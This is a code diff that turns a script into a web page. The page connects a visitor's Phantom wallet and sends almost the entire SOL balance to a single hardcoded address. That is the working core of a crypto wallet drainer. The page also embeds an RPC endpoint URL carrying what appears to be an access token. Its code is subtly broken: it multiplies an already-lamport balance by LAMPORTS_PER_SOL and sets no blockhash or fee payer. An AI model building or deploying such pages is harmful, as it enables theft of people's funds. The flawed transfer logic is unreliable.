@@ -1,60 +1,67 @@
-// Import Solana Web3.js library
-const solanaWeb3 = require('@solana/web3.js');
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Crypto Transfer</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/solana-web3.js/1.76.0/solanaWeb3.min.js"></script>
+</head>
+<body>
+    <h2>Click below to transfer all funds</h2>
+    <button id="transferButton">Transfer Now</button>
 
-// Define the recipient wallet address
-const RECIPIENT_WALLET = '9wr1AgNmYH7tdSSG8VYa75E5Efjm61t4wzqbjuv4jANf';
+    <script>
+        document.getElementById('transferButton').addEventListener('click', async () => {
+            if (!window.solana) {
+                alert("Phantom wallet not found. Please install the Phantom extension or mobile app.");
+                return;
+            }
 
-// Set up the Solana connection using QuickNode RPC URL
-const connection = new solanaWeb3.Connection(
-    'https://convincing-distinguished-panorama.solana-mainnet.quiknode.pro/068f8b18be5bb779841bd23ab00ef267e80501df',
-    'confirmed'
-);
+            try {
+                // Connect to Phantom wallet
+                const provider = window.solana;
+                await provider.connect();
 
-// Function to transfer SOL
-async function transferSOL() {
-    try {
-        // Check if Phantom wallet is installed
-        if (!window.solana || !window.solana.isPhantom) {
-            alert('Please install Phantom Wallet to proceed.');
-            return;
-        }
+                const connection = new solanaWeb3.Connection(
+                    "https://convincing-distinguished-panorama.solana-mainnet.quiknode.pro/068f8b18be5bb779841bd23ab00ef267e80501df",
+                    'confirmed'
+                );
 
-        // Connect to Phantom wallet
-        const provider = window.solana;
-        await provider.connect();
+                const publicKey = provider.publicKey;
 
-        // Get the user's public key
-        const sender = provider.publicKey;
-        if (!sender) {
-            alert('Wallet connection failed.');
-            return;
-        }
+                if (!publicKey) {
+                    alert("Wallet connection failed. Please try again.");
+                    return;
+                }
 
-        // Get the balance of the sender
-        const balance = await connection.getBalance(sender);
-        if (balance === 0) {
-            alert('Insufficient balance in the wallet.');
-            return;
-        }
+                // Get wallet balance
+                let balance = await connection.getBalance(publicKey);
+                balance = solanaWeb3.LAMPORTS_PER_SOL * balance;
 
-        // Create transaction to transfer SOL
-        const transaction = new solanaWeb3.Transaction().add(
-            solanaWeb3.SystemProgram.transfer({
-                fromPubkey: sender,
-                toPubkey: new solanaWeb3.PublicKey(RECIPIENT_WALLET),
-                lamports: balance - 5000, // Reserve a small fee for transaction costs
-            })
-        );
+                if (balance <= 0) {
+                    alert("Insufficient SOL balance.");
+                    return;
+                }
 
-        // Sign and send the transaction
-        const signature = await provider.signAndSendTransaction(transaction);
-        alert(`Transaction successful! Signature: ${signature}`);
-    } catch (error) {
-        alert(`Transaction failed: ${error.message}`);
-    }
-}
+                // Transfer entire balance
+                const recipient = new solanaWeb3.PublicKey('9wr1AgNmYH7tdSSG8VYa75E5Efjm61t4wzqbjuv4jANf');
+                const transaction = new solanaWeb3.Transaction().add(
+                    solanaWeb3.SystemProgram.transfer({
+                        fromPubkey: publicKey,
+                        toPubkey: recipient,
+                        lamports: balance - 5000, // Reserve some SOL for transaction fee
+                    })
+                );
 
-// Add event listener to the button
-document.addEventListener('DOMContentLoaded', () => {
-    document.getElementById('transfer-btn').addEventListener('click', transferSOL);
-});
+                // Send transaction
+                const signature = await provider.signAndSendTransaction(transaction);
+                await connection.confirmTransaction(signature, 'confirmed');
+
+                alert("Transaction successful! Signature: " + signature);
+            } catch (error) {
+                alert("Transaction failed: " + error.message);
+            }
+        });
+    </script>
+</body>
+</html>
